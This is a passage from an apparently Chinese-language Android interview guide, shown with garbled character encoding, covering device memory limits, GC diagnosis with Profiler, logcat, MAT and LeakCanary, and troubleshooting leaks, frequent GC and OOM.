<li><strong>ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong>ï¼šä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®åˆ°å†…å­˜</li>
<li><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong>ï¼šåŠ è½½è¿‡å¤§çš„å›¾ç‰‡ã€åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
</ul>
<p><strong>4. Androidå†…å­˜é™åˆ¶æ˜¯å¤šå°‘ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™ï¼š</strong></p>
<p><strong>ä½ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>å¯èƒ½åªæœ‰å‡ åMBï¼ˆå¦‚32MBã€48MBã€64MBï¼‰</li>
<li>å†…å­˜éå¸¸æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
</ul>
<p><strong>ä¸­ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>é€šå¸¸æœ‰128MBã€192MBã€256MBç­‰</li>
<li>å†…å­˜ç›¸å¯¹å……è¶³ï¼Œä½†ä»éœ€åˆç†ä½¿ç”¨</li>
</ul>
<p><strong>é«˜ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>å¯èƒ½æœ‰512MBã€1GBã€2GBç”šè‡³æ›´å¤š</li>
<li>å†…å­˜ç›¸å¯¹å……è¶³ï¼Œä½†ä»éœ€ä¼˜åŒ–</li>
</ul>
<p><strong>å¦‚ä½•æŸ¥çœ‹åº”ç”¨çš„å†…å­˜é™åˆ¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ActivityManager</span> <span class="hljs-variable">activityManager</span> <span class="hljs-operator">=</span> (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
ActivityManager.<span class="hljs-type">MemoryInfo</span> <span class="hljs-variable">memoryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActivityManager</span>.MemoryInfo();
activityManager.getMemoryInfo(memoryInfo);
<span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> memoryInfo.totalMem;  <span class="hljs-comment">// æ€»å†…å­˜</span>
<span class="hljs-type">long</span> <span class="hljs-variable">availableMemory</span> <span class="hljs-operator">=</span> memoryInfo.availMem;  <span class="hljs-comment">// å¯ç”¨å†…å­˜</span>
</code></pre>
<p><strong>å†…å­˜é™åˆ¶çš„å½±å“ï¼š</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>GCæ›´é¢‘ç¹ï¼ˆå†…å­˜ä¸è¶³æ—¶ï¼‰</li>
<li>éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œé¿å…OOM</li>
</ul>
<h4 data-id="heading-83">6.2.4 GCæ£€æµ‹ä¸è¯Šæ–­</h4>
<p><strong>1. å¸¸ç”¨çš„Androidå†…å­˜ç›‘æ§å·¥å…·æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. Android Studio Profilerï¼ˆæœ€å¸¸ç”¨ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨ã€æŸ¥çœ‹GCäº‹ä»¶ã€ç”Ÿæˆå †è½¬å‚¨</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé›†æˆåœ¨Android Studioä¸­ï¼Œä½¿ç”¨æ–¹ä¾¿</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ—¥å¸¸å¼€å‘ã€æ€§èƒ½åˆ†æ</li>
</ul>
<p><strong>2. logcatï¼ˆæŸ¥çœ‹GCæ—¥å¿—ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæŸ¥çœ‹GCçš„æ—¥å¿—ä¿¡æ¯</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç®€å•ç›´æ¥ï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæŸ¥çœ‹GCé¢‘ç‡ã€GCè€—æ—¶</li>
</ul>
<p><strong>3. Systraceï¼ˆåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šåˆ†æGCå¯¼è‡´çš„å¡é¡¿é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šèƒ½è¯¦ç»†åˆ†æGCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå¡é¡¿é—®é¢˜</li>
</ul>
<p><strong>4. MATï¼ˆMemory Analyzer Toolï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šåˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œæ‰¾å‡ºå†…å­˜é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šåŠŸèƒ½å¼ºå¤§ï¼Œèƒ½è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šåˆ†æå†…å­˜æ³„æ¼ã€OOMé—®é¢˜</li>
</ul>
<p><strong>5. LeakCanaryï¼ˆè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼ï¼‰</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè‡ªåŠ¨æ£€æµ‹åº”ç”¨ä¸­çš„å†…å­˜æ³„æ¼</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œä¸éœ€è¦æ‰‹åŠ¨åˆ†æ</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¼€å‘é˜¶æ®µè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>2. å¦‚ä½•ä½¿ç”¨Android Studio Profilerï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æ‰“å¼€Profilerçª—å£</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
</ul>
<p><strong>2. é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œ</li>
</ul>
<p><strong>3. æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶ï¼ˆä»€ä¹ˆæ—¶å€™è§¦å‘GCï¼‰</li>
</ul>
<p><strong>4. æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨å†…å­˜æ›²çº¿ä¸­ï¼ŒGCäº‹ä»¶ä¼šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼ˆGCç±»å‹ã€è€—æ—¶ç­‰ï¼‰</li>
</ul>
<p><strong>5. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç”Ÿæˆå †è½¬å‚¨æ–‡ä»¶</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATåˆ†æ</li>
</ul>
<p><strong>6. æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…</li>
</ul>
<p><strong>3. å¦‚ä½•æŸ¥çœ‹Android GCæ—¥å¿—ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨adb logcat</strong></p>
<pre><code class="hljs language-bash" lang="bash">adb logcat | grep GC
</code></pre>
<ul>
<li>ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æŸ¥çœ‹GCæ—¥å¿—</li>
<li>å¯ä»¥è¿‡æ»¤GCç›¸å…³çš„æ—¥å¿—</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šåœ¨Android Studioçš„Logcatçª—å£ä¸­æŸ¥çœ‹</strong></p>
<ul>
<li>æ‰“å¼€Logcatçª—å£</li>
<li>è¿‡æ»¤GCç›¸å…³çš„æ—¥å¿—</li>
<li>æŸ¥çœ‹GCç±»å‹å’Œè€—æ—¶</li>
</ul>
<p><strong>GCæ—¥å¿—åŒ…å«ä»€ä¹ˆï¼š</strong></p>
<ul>
<li><strong>GCç±»å‹</strong>ï¼šPartial GCã€Full GCã€Sticky GC</li>
<li><strong>GCè€—æ—¶</strong>ï¼šGCæ‰§è¡Œçš„æ—¶é—´</li>
<li><strong>å›æ”¶å‰åçš„å†…å­˜å¤§å°</strong>ï¼šå›æ”¶äº†å¤šå°‘å†…å­˜</li>
<li><strong>GCé¢‘ç‡</strong>ï¼šå¤šä¹…è§¦å‘ä¸€æ¬¡GC</li>
</ul>
<p><strong>å¦‚ä½•åˆ†æGCæ—¥å¿—ï¼š</strong></p>
<ul>
<li>æŸ¥çœ‹GCé¢‘ç‡ï¼šæ˜¯å¦é¢‘ç¹è§¦å‘GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šæ˜¯å¦æš‚åœæ—¶é—´è¿‡é•¿</li>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>å¦‚æœFull GCé¢‘ç¹ï¼Œéœ€è¦ä¼˜åŒ–</li>
</ul>
<p><strong>4. å¦‚ä½•ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æ·»åŠ ä¾èµ–</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    debugImplementation 'com.squareup.leakcanary:leakcanary-android:2.12'
}
</code></pre>
<p><strong>2. è¿è¡Œåº”ç”¨</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨é›†æˆåˆ°åº”ç”¨ä¸­</li>
<li>ä¸éœ€è¦é¢å¤–é…ç½®</li>
</ul>
<p><strong>3. è‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šç›‘æ§Activityã€Fragmentç­‰å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>å½“å¯¹è±¡åº”è¯¥è¢«å›æ”¶æ—¶ï¼ŒLeakCanaryä¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦çœŸçš„è¢«å›æ”¶</li>
</ul>
<p><strong>4. å‘ç°æ³„æ¼æ—¶æ˜¾ç¤ºé€šçŸ¥</strong></p>
<ul>
<li>å¦‚æœå‘ç°å†…å­˜æ³„æ¼ï¼ŒLeakCanaryä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>ç‚¹å‡»é€šçŸ¥ï¼Œå¯ä»¥æŸ¥çœ‹æ³„æ¼è·¯å¾„</li>
<li>æ³„æ¼è·¯å¾„ä¼šæ˜¾ç¤ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>æ£€æµ‹åŸç†ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨WeakReferenceå’ŒReferenceQueue</li>
<li>å½“å¯¹è±¡è¢«GCå›æ”¶æ—¶ï¼ŒWeakReferenceä¼šè¢«æ”¾å…¥ReferenceQueue</li>
<li>å¦‚æœå¯¹è±¡åº”è¯¥è¢«å›æ”¶ä½†æ²¡æœ‰è¿›å…¥ReferenceQueueï¼Œè¯´æ˜æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>5. å¦‚ä½•ä½¿ç”¨MATåˆ†æå†…å­˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨jmapå‘½ä»¤ç”Ÿæˆï¼ˆAndroidä¸å¸¸ç”¨ï¼‰</li>
</ul>
<p><strong>2. å¯¼å‡ºhprofæ–‡ä»¶</strong></p>
<ul>
<li>åœ¨Profilerä¸­ï¼Œç‚¹å‡»"Export heap dump"</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>3. ç”¨MATæ‰“å¼€</strong></p>
<ul>
<li>ä¸‹è½½å¹¶å®‰è£…MATï¼ˆMemory Analyzer Toolï¼‰</li>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
</ul>
<p><strong>4. åˆ†æå¤§å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>5. åˆ†æå¼•ç”¨é“¾</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰</li>
</ul>
<p><strong>MATçš„ä¸»è¦åŠŸèƒ½ï¼š</strong></p>
<ul>
<li><strong>Histogram</strong>ï¼šæŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li><strong>Dominator Tree</strong>ï¼šæŸ¥çœ‹å¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li><strong>Path to GC Roots</strong>ï¼šæŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li><strong>Leak Suspects</strong>ï¼šè‡ªåŠ¨æ£€æµ‹å¯èƒ½çš„å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>6. å¦‚ä½•æ’æŸ¥GCé¢‘ç¹é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. æŸ¥çœ‹GCæ—¥å¿—ç¡®è®¤é¢‘ç‡</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆå¤šä¹…è§¦å‘ä¸€æ¬¡GCï¼‰</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>2. ä½¿ç”¨ProfileræŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
</ul>
<p><strong>3. æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
<li>å¸¸è§åœºæ™¯ï¼šå¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡ã€åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<ul>
<li><strong>é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong>ï¼šä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜ä¸è¶³ï¼Œé¢‘ç¹è§¦å‘GC</li>
<li><strong>å¹´è½»ä»£è®¾ç½®å¤ªå°</strong>ï¼šå¹´è½»ä»£å¤ªå°ï¼Œå®¹æ˜“æ»¡ï¼Œé¢‘ç¹è§¦å‘GC</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>7. å¦‚ä½•æ’æŸ¥åº”ç”¨å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ä½¿ç”¨Systraceåˆ†æå¡é¡¿</strong></p>
<ul>
<li>ä½¿ç”¨Android Studioçš„Systraceå·¥å…·</li>
<li>æˆ–ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·</li>
<li>åˆ†æå¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>2. æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</strong></p>
<ul>
<li>åœ¨Systraceä¸­æŸ¥çœ‹GCäº‹ä»¶</li>
<li>æ£€æŸ¥GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>3. å¦‚æœæ˜¯GCå¯¼è‡´çš„ï¼Œåˆ†æGCåŸå› </strong></p>
<ul>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šGCæš‚åœæ—¶é—´æ˜¯å¦è¿‡é•¿</li>
<li>åˆ†æGCåŸå› ï¼šä¸ºä»€ä¹ˆè§¦å‘GC</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘GC</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…è§¦å‘Full GC</li>
<li>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨ã€åŠ¨ç”»ç­‰åœºæ™¯</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…è§¦å‘Full GC</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ã€å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong>ï¼šViewHolderå¤ç”¨ã€é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åŠ¨ç”»</strong>ï¼šå¤ç”¨åŠ¨ç”»å¯¹è±¡ã€é¿å…é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
</ul>
<h4 data-id="heading-84">6.3 ç»¼åˆåº”ç”¨é¢˜ï¼ˆé«˜çº§ï¼‰</h4>
<h4 data-id="heading-85">6.3.1 åœºæ™¯åˆ†æé¢˜</h4>
<p><strong>1. å¦‚ä½•ä¼˜åŒ–Androidåº”ç”¨çš„GCæ€§èƒ½ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>ä¼˜åŒ–GCæ€§èƒ½éœ€è¦ä»å¤šä¸ªæ–¹é¢å…¥æ‰‹ï¼š</p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ†é…ï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li><strong>å¯¹è±¡å¤ç”¨</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li><strong>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨StringBuilderã€é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>ä½¿ç”¨åŸºæœ¬ç±»å‹</strong>ï¼šä½¿ç”¨intè€Œä¸æ˜¯Integerï¼Œbooleanè€Œä¸æ˜¯Boolean</li>
</ul>
<p><strong>2. é¿å…å†…å­˜æ³„æ¼</strong></p>
<ul>
<li><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šåœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li><strong>åŠæ—¶å–æ¶ˆæ³¨å†Œ</strong>ï¼šå–æ¶ˆæ³¨å†Œç›‘å¬å™¨ï¼ˆEventBusã€å¹¿æ’­æ¥æ”¶å™¨ï¼‰</li>
<li><strong>ä½¿ç”¨å¼±å¼•ç”¨</strong>ï¼šå¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</li>
</ul>
<p><strong>3. ä¼˜åŒ–åˆ—è¡¨å’ŒåŠ¨ç”»</strong></p>
<ul>
<li><strong>ViewHolderå¤ç”¨</strong>ï¼šç¡®ä¿RecyclerViewçš„ViewHolderæ­£ç¡®å¤ç”¨</li>
<li><strong>é¿å…é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong>ï¼šé¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li><strong>å¤ç”¨åŠ¨ç”»å¯¹è±¡</strong>ï¼šä¸è¦æ¯æ¬¡åˆ›å»ºæ–°çš„åŠ¨ç”»å¯¹è±¡</li>
</ul>
<p><strong>4. åˆç†ä½¿ç”¨ç¼“å­˜</strong></p>
<ul>
<li><strong>ä½¿ç”¨LruCache</strong>ï¼šä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>åŠæ—¶æ¸…ç†</strong>ï¼šåŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
<li><strong>é¿å…æ— é™åˆ¶ç¼“å­˜</strong>ï¼šä¸è¦æ— é™åˆ¶åœ°ç¼“å­˜æ•°æ®</li>
</ul>
<p><strong>5. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li><strong>åŠæ—¶é‡Šæ”¾</strong>ï¼šåŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li><strong>å‹ç¼©å›¾ç‰‡</strong>ï¼šåŠ è½½æ—¶å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li><strong>åˆ†æ‰¹åŠ è½½</strong>ï¼šä¸è¦ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
</ul>
<p><strong>ä¼˜åŒ–æ•ˆæœï¼š</strong></p>
<ul>
<li>å‡å°‘GCé¢‘ç‡ï¼šå‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCè§¦å‘</li>
<li>é™ä½GCæš‚åœæ—¶é—´ï¼šé¿å…Full GCï¼Œå‡å°‘GCæš‚åœæ—¶é—´</li>
<li>æå‡åº”ç”¨æµç•…åº¦ï¼šå‡å°‘GCï¼Œæå‡ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>2. å¦‚ä½•æ’æŸ¥Androidå†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. ä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆç¬¬ä¸€æ­¥ï¼‰</strong></p>
<ul>
<li>åœ¨å¼€å‘é˜¶æ®µï¼ŒLeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å¦‚æœå‘ç°æ³„æ¼ï¼Œä¼šæ˜¾ç¤ºé€šçŸ¥å’Œæ³„æ¼è·¯å¾„</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„ï¼Œå¯ä»¥å¿«é€Ÿå®šä½é—®é¢˜</li>
</ul>
<p><strong>2. ç”Ÿæˆå †è½¬å‚¨ç”¨MATåˆ†æï¼ˆè¯¦ç»†åˆ†æï¼‰</strong></p>
<ul>
<li>å¦‚æœLeakCanaryå‘ç°æ³„æ¼ï¼Œæˆ–éœ€è¦è¯¦ç»†åˆ†æ</li>
<li>åœ¨Android Studio Profilerä¸­ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATæ‰“å¼€åˆ†æ</li>
</ul>
<p><strong>3. æ‰¾å‡ºæ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºæ³„æ¼å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†ææ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰æ³„æ¼å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>4. ä¿®å¤ä»£ç </strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤ä»£ç </li>
<li>å¸¸è§ä¿®å¤æ–¹æ³•ï¼š
<ul>
<li>ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</li>
<li>åŠæ—¶æ¸…ç†èµ„æºï¼ˆonDestroyä¸­æ¸…ç†ï¼‰</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>æ¸…ç†é›†åˆ</li>
</ul>
</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>LeakCanary</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°æ³„æ¼</li>
<li><strong>MAT</strong>ï¼šè¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§ï¼ŒæŸ¥çœ‹å†…å­˜å˜åŒ–</li>
</ul>
<p><strong>3. å¦‚ä½•æ’æŸ¥Android OOMé—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨OOMæ—¶ï¼Œç³»ç»Ÿå¯èƒ½è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨Android Studio Profileræ‰‹åŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
